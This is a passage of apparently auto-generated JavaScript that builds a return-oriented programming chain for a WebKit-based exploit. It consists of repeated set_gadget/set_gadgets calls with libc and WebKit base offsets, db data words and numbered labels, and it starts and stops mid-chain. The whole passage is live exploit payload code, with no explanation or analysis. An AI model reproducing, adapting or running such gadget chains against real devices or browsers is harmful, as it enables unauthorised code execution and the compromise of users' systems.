set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+101296, //L909
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+101352, //L911
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L911:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+101464, //L915
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L913:
db([15, 0]); // 0xf
set_gadget(libc_base+772328,); //pop rcx
//L914:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L915:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+101544, //L916
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+101560, //L917
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L916:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+101648, //L918
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L918:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+101704, //L920
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L920:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+101776, //L922
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L922:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+101832, //L924
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L924:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L926:
libc_base+432565, //mov rax, rdx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+101984, //L928
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L927:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L928:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+102088, //L931
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+102072, //L930
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L930:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L931:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+102232, //L935
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+102200, //L933
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+102216, //L934
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L933:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L934:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L935:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+102304, //L936
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L936:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+102360, //L938
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L938:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+102472, //L942
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L940:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L941:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L942:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+102552, //L943
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+102568, //L944
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L943:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L944:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+102656, //L945
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L945:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+102712, //L947
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L947:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+102784, //L949
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L949:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+102840, //L951
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L951:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L953:
libc_base+713278, //pop rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+102992, //L955
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L954:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L955:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+103096, //L958
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+103080, //L957
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L957:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L958:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+103240, //L962
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+103208, //L960
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+103224, //L961
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L960:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L961:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L962:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+103312, //L963
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+103368, //L965
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L965:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+103480, //L969
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L967:
db([17, 0]); // 0x11
set_gadget(libc_base+772328,); //pop rcx
//L968:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L969:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+103560, //L970
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+103576, //L971
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L970:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+103664, //L972
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L972:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+103720, //L974
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L974:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+103792, //L976
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L976:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+103848, //L978
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L978:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+103952, //L981
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L980:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L981:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+104056, //L984
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+104040, //L983
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L983:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L984:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+104200, //L988
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+104168, //L986
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+104184, //L987
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L986:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L987:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L988:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+104272, //L989
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L989:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+104328, //L991
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L991:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+104440, //L995
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L993:
db([4, 0]); // 0x4
set_gadget(libc_base+772328,); //pop rcx
//L994:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L995:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+104520, //L996
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+104536, //L997
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L996:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L997:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+104624, //L998
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L998:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+104680, //L1000
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1000:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+104800, //L1003
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1002:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1003:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+104904, //L1006
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+104888, //L1005
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1005:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1006:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+105048, //L1010
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+105016, //L1008
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+105032, //L1009
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1008:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1009:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1010:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+105120, //L1011
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+105176, //L1013
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1013:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+105288, //L1017
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1015:
db([18, 0]); // 0x12
set_gadget(libc_base+772328,); //pop rcx
//L1016:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1017:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+105368, //L1018
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+105384, //L1019
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1018:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1019:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+105472, //L1020
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1020:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+105528, //L1022
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1022:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+105600, //L1024
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1024:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+105656, //L1026
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1026:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1028:
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+105808, //L1030
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1029:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1030:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+105912, //L1033
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+105896, //L1032
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1032:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1033:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+106056, //L1037
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+106024, //L1035
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+106040, //L1036
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1035:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1036:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1037:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+106128, //L1038
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1038:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+106184, //L1040
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1040:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+106296, //L1044
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1042:
db([19, 0]); // 0x13
set_gadget(libc_base+772328,); //pop rcx
//L1043:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1044:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+106376, //L1045
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+106392, //L1046
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1045:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+106480, //L1047
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1047:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+106536, //L1049
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1049:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+106608, //L1051
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1051:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+106664, //L1053
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1053:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1055:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+106816, //L1057
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1056:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1057:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+106920, //L1060
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+106904, //L1059
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1059:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+107064, //L1064
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+107032, //L1062
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+107048, //L1063
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1062:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1063:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1064:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+107136, //L1065
